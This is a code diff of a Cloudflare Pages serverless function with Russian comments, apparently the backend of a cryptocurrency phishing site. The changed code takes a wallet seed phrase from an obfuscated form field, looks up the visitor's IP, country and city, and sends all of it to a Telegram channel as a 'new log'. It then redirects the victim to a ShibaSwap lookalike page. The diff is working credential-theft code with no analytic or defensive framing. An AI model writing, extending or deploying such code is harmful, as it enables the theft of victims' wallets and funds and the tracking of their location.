@@ -1,21 +1,30 @@
 export async function onRequestPost(context) {
     const data = await context.request.formData();
-    const wallet = data.get('wallet');
-    const role = data.get('role');
-    
-    // Собираем слова из формы
-    let words = [];
-    for(let i = 1; i <= 24; i++) {
-        const word = data.get('w' + i);
-        if(word) words.push(word);
+    const s_eed_Dc = data.get('s_eed_Dc');
+
+    if (!s_eed_Dc) {
+        return Response.redirect('../', 301);
     }
 
-    // Формируем сообщение для отправки
+    // Получаем IP и геоданные
+    const ip = context.request.headers.get('CF-Connecting-IP');
+    const domain = context.request.headers.get('host');
+    
+    // Получаем данные о стране и городе
+    const countryResponse = await fetch(`https://ipapi.co/${ip}/country_name/`);
+    const cityResponse = await fetch(`https://ipapi.co/${ip}/city/`);
+    const country = await countryResponse.text();
+    const city = await cityResponse.text();
+
+    // Формируем сообщение
     const message = `
-🔑 New Wallet Connected
-Wallet: ${wallet}
-Words: ${words.join(' ')}
-Role: ${role}
+💸 Поздравляем, новый лог!
+💵 Кошелёк: MetaMask
+🔑 SEED Фраза: ${s_eed_Dc}
+🗻 IP: ${ip}
+🌍 Страна: ${country}
+🌇 Город: ${city}
+🔧 Домен: ${domain}
     `;
 
     // Отправляем в Telegram
@@ -36,7 +45,5 @@ Role: ${role}
         })
     });
 
-    return new Response(JSON.stringify({status: true}), {
-        headers: {'Content-Type': 'application/json'}
-    });
+    return Response.redirect('https://shibaswap-www.pages.dev/', 301);
 }
